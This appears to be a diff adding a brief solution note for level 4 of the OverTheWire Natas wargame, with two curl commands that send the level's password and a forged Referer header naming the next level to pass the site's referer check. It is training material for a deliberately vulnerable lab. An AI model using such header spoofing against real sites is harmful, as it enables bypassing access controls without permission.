@@ -1,0 +1,15 @@
+Natas 4:
+
+T.T.K = HTTP, HTTP refering , various extensions for controlling http referer,curl command (Terminal)
+
+M.A = using curl with user(for providing login credentials) and referer(for manipulating referer) arguments in the below specified format
+----------------------------------------------------------------------------------------------------------------------------
+curl --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
+---------------------------------------------------------------------------------------------------------------------------
+or 
+----------------------------------------------------------------------------------------------------------------------------
+curl "http://natas4.natas.labs.overthewire.org/index.php" \
+        -e "http://natas5.natas.labs.overthewire.org/" \
+         -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+---------------------------------------------------------------------------------------------------------------------------
+Sources: http://cpansearch.perl.org/src/DOHERTY/Hack-Natas-0.003/walkthrough/natas-4.mkdn
